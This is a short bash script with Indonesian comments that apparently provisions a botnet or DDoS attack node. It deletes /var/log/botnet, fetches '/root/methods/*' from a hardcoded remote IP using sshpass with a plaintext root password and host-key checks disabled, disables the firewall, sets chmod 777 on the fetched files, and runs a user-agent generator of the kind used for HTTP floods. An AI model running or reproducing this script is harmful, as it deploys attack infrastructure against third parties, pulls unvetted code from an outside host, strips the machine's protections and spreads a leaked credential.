# Install paket yang diperlukan
DEBIAN_FRONTEND=noninteractive apt install -y sshpass npm nodejs python3 build-essential squid

# Membersihkan dan menyiapkan direktori
pkill node
pkill screen
rm -rf /mnt/.trash
rm -rf /var/log/botnet
mkdir /mnt/.trash
cd /mnt/.trash

# Memindahkan file dengan scp
sshpass -p 'lex' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r root@159.223.47.71:/root/methods/* ./

# Menginstal NVM dan Node.js
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm" && [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
nvm install 20 || echo 'Node.js sudah terpasang'

# Instalasi npm dan pm2
npm install
# Mengatur firewall
ufw disable
ufw reload

# Menjalankan skrip perbaikan
cd ./lib/cache
chmod 777 *

# Memulai proses di screen
cd ../..
node ./lib/cache/uagen.js 10000 ua.txt

# Mengatur firewall untuk port yang diperlukan
ufw allow 812
ufw allow 22
ufw allow 443
ufw allow 80
ufw reload
